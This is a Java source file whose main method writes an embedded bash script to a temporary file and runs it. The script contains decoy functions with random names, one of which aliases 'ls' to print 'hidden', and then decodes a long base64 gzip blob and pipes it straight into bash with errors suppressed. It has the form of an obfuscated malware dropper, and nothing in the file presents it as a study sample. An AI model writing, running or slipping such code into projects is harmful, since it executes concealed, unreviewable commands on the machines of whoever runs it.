import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

v0xkazraf() { echo $((RANDOM * RANDOM)); }
v3ijcw828() { for i in {1..3}; do :; done; }
vf0xfky3a() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
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
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
